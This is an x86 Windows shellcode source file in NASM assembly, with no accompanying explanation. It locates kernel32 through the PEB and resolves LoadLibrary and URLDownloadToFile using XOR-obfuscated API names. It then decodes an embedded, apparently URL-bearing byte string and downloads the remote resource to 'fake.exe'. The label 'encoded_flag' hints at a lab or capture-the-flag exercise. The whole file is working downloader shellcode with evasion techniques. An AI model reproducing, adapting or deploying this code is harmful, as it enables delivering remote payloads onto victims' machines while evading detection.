[SECTION .text]

BITS 32

global _start

_start: 
    xor ecx, ecx
    xor esi, esi
    mov    esi, [fs:0x30]               ;&PEB  
    mov    esi, dword [esi+0xc]         ;&PEB_LDR_MODULE
    lea    edi, [esi+0x1c]              ;PEB_LDR_MODULE->InInitOrder
    mov    esi, dword [esi+0x1c]        ;LDR_MODULE->InInitOrder

    next_dll_name:
        lea    eax,[esi+0x1c]           ;LDR_MODULE->BaseDllName
        call   hash_dll_name
        cmp    eax,0x8cee17e5
        jne    flink
        mov    ebx,dword [esi+0x8]
        mov    dword [ebp-0x4],ebx      ; Store base address of kernel32.dll
        mov    dword [ebp-0x8], 0x1
    flink:
        mov    esi,dword [esi]          ; esi = next ldr module
        cmp    esi,edi
        jne    next_dll_name
        mov ebx, dword  [ebp-0x4]
        xor edx, edx
        push edx
        mov edx, 0x172111c5
        xor edx, 0x65437889
        push edx                        ; Libr
        mov edx, 0x50371c4d
        xor edx, 0x34567301
        push edx                        ; Load
        mov dword [ebp-0xc], esp
        jmp get_export_table_info

    execute_load_libray_function:
        add esp, 0x8
        mov edx, 0x34566514
        xor edx, 0x34560978
        push edx                        ; ll
        mov edx, 0x567826ff
        xor edx, 0x32564890
        push edx                        ; on.d
        mov edx, 0x8229b16a
        xor edx, 0xef45c31f
        push edx                        ; urlm
        push esp
        call eax
        inc dword [ebp-0x8]

        mov ebx, eax
        add esp, 0xc
        xor edx, edx
        push edx
        mov edx, 0x819c2176
        xor edx, 0xedf56719
        push edx                        ;oFil
        mov edx, 0x111c06ff
        xor edx, 0x45786790
        push edx                        ;oadT
        mov edx, 0x5313fbff
        xor edx, 0x3f7d8c90
        push edx                        ; ownl
        mov edx, 0x706d3726
        xor edx, 0x34216573
        push edx                        ; URLD
        mov dword [ebp-0xc], esp
        jmp get_export_table_info

    execute_url_download_function:
        add esp, 0x18
        jmp get_address_encoded_flag
    
    decode_flag:
        pop edx
        mov esi, edx
        xor ecx, ecx
        decoding_loop:
        mov dl, byte [esi+ecx+0x1]
        xor byte [esi+ecx], dl
        mov edx, 0xdeadbef1
        xor edx, 0xdeadbeef
        inc ecx
        cmp ecx, edx
        jnz decoding_loop
        xor byte [esi+ecx], 0x89

        xor edx, edx
        push edx
        push 0x6578652e
        push 0x656b6166
        mov edi, esp
        push edx
        push edx
        push edi
        push esi
        push edx
        call eax
        add esp, 0x10
        inc dword [ebp-0x8]
        
        mov ebx, dword  [ebp-0x4]
        mov edx, 0x201ce151
        xor edx, 0x43739301
        push edx                            ; Proc
        mov edx, 0xd5950aa
        xor edx, 0x793028ef
        push edx                            ; Exit
        mov dword [ebp-0xc], esp
        jmp get_export_table_info
    
    execute_exit_process:
        xor edx, edx
        push edx
        call eax

    get_export_table_info:
        mov eax, dword [ebx + 0x3C]	        ; RVA of PE signature
        add eax, ebx       		            ; eax = Address of PE signature
        mov eax, dword [eax + 0x78]         ; eax = RVA of Export Table
        add eax, ebx 			            ; eax = Address of Export Table
        
        mov ecx, dword [eax + 0x24]         ; ecx = RVA of Ordinal Table
        add ecx, ebx 			            ; ecx = Address of Ordinal Table
        mov dword [ebp-0x18], ecx

        mov edi, dword [eax + 0x20]         ; edi = RVA of Name Pointer Table
        add edi, ebx 			            ; edi = Address of Name Pointer Table
        mov dword [ebp-0x1c], edi

        mov edx, dword [eax + 0x1C]         ; edx = RVA of Address Table
        add edx, ebx 			            ; edx = Address of Address Table
        mov dword [ebp-0x20], edx 

        mov edx, dword [eax + 0x14]         ; edx = Number of functions to go throw
        xor eax, eax 

    loop_throw_functions:
        mov edi, [ebp-0x1c] 	            ; edi = Address of Name Pointer Table
        mov esi, [ebp-0xc] 	                ; esi = name of function to find
        xor ecx, ecx
        cld  			                    ; DF=0
        mov edi, [edi + eax*0x4]	        ; edi = RVA of an entry in Name Table
        add edi, ebx       	                ; edi = address of the string
        cmp dword [ebp-0x8], 0x2
        jnz case_loadlibrary_exitprocess
        add cx, 0x10                        ; Length of strings to compare 
        jmp compare_strings

    case_loadlibrary_exitprocess:
        add cx, 0x8 		                ; Length of strings to compare 
    
    compare_strings:
        repe cmpsb        	        
        jz function_found

        inc eax
        cmp eax, edx
        jb loop_throw_functions

    function_found:
        mov ecx, [ebp-0x18] 	            ; ecx  = Address of Ordinal Table
        mov edx, [ebp-0x20]  	            ; edx = Address of Address Table

        mov ax, [ecx + eax*2] 	            ; ax = ordinal number
        mov eax, [edx + eax*4] 	            ; eax = RVA of function 
        add eax, ebx 	                    ; eax = address of function
        cmp dword [ebp-0x8], 0x1
        jz execute_load_libray_function
        cmp dword [ebp-0x8], 0x2
        jz execute_url_download_function
        cmp dword [ebp-0x8], 0x3
        jz execute_exit_process
    
    hash_dll_name:
        push   esi
        xor    edx,edx
        mov    ecx,dword [eax]
        and    ecx,0xffff
        je     loop_hash
        mov    esi,dword [eax+0x4]
        xor    eax,eax
        lodsb
        dec    ecx
        loop_hash:
            rol    edx,0x5
            and    al,0xdf
            add    edx,eax
            lodsb
            dec    ecx
            jne    loop_hash
        mov    eax,edx
        pop    esi
        ret

    get_address_encoded_flag:
        call decode_flag
        encoded_flag: db 0xf5, 0xb3, 0xff, 0xbe, 0xf9, 0xd4, 0x9d, 0xf0, 0xb1, 0xdf, 0x96, 0xf8, 0x9c, 0xf5, 0x96, 0xf7, 0x83, 0xec, 0x9e, 0xd1, 0xb7, 0xf4, 0x9b, 0xf6, 0x86, 0xf4, 0x9b, 0xf6, 0x9f, 0xec, 0x89
